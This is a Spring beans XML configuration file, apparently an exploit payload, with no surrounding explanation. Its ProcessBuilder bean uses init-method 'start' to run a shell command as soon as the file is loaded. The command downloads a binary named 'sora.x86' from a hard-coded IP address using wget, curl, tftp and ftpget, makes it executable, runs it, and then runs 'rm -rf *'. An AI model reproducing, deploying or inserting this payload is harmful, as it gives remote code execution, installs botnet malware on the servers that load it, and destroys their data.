<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">

    <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
        <constructor-arg>
            <list>
                <value>sh</value>
                <value>-c</value>
                <value>cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.114.80/bins/sora.x86; curl -O http://196.251.114.80/bins/sora.x86; chmod 777 sora.x86; sh sora.x86; tftp 196.251.114.80 -c get sora.x86; chmod 777 sora.x86; sh sora.x86; tftp -r sora.x86 -g 196.251.114.80; chmod 777 sora.x86; sh sora.x86; ftpget -v -u anonymous -p anonymous -P 21 196.251.114.80 sora.x86 sora.x86; sh sora.x86; rm -rf sora.x86 sora.x86 sora.x86 sora.x86; rm -rf *</value>
            </list>
        </constructor-arg>
    </bean>
</beans>
